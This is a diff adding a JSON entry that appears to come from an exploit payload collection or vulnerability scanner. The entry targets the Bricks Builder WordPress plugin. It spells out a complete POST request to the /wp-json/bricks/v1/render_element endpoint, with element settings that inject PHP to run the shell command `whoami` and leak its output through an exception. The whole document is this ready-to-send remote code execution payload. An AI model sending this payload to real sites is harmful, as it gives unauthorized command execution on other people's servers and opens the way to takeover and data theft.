@@ -1,0 +1,24 @@
+{
+    "categories": ["RCE", "BACKDOOR", "WordPress", "Bricks"],
+    "tags": ["wordpress", "bricks", "rce", "remote code execution", "php injection", "exception"],
+    "description": "Payload exploiting Bricks Builder render_element endpoint to achieve RCE via crafted element settings",
+    "payload": {
+        "route": "/wp-json/bricks/v1/render_element",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json"
+        },
+        "body": {
+            "postId": "1",
+            "nonce": "fixed-nonce-value",
+            "element": {
+                "name": "code",
+                "settings": {
+                    "executeCode": "true",
+                    "code": "<?php throw new Exception(`whoami` . \"END\"); ?>"
+                }
+            }
+        },
+        "query": {}
+    }
+}
